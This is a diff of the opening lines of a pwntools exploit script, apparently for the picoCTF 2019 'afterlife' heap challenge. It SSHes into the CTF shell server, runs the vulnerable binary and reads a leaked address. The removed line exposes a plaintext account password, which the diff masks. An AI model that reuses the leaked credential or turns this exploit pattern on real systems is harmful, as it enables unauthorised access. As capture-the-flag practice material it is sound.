@@ -1,6 +1,6 @@
 from pwn import *
 
-sh = ssh(host='2019shell1.picoctf.com', user='jamesyoung', password='pBCNtaNiAc7Fs&F')
+sh = ssh(host='2019shell1.picoctf.com', user='jamesyoung', password='***************')
 server = sh.process(['vuln', 'aaaaaaaaaaaaaaaa'], cwd='/problems/afterlife_6_1c6bc56bd64007e5162e284db4d03df5')
 
 leak = int(server.recvuntil('useful...').split('\n')[1])
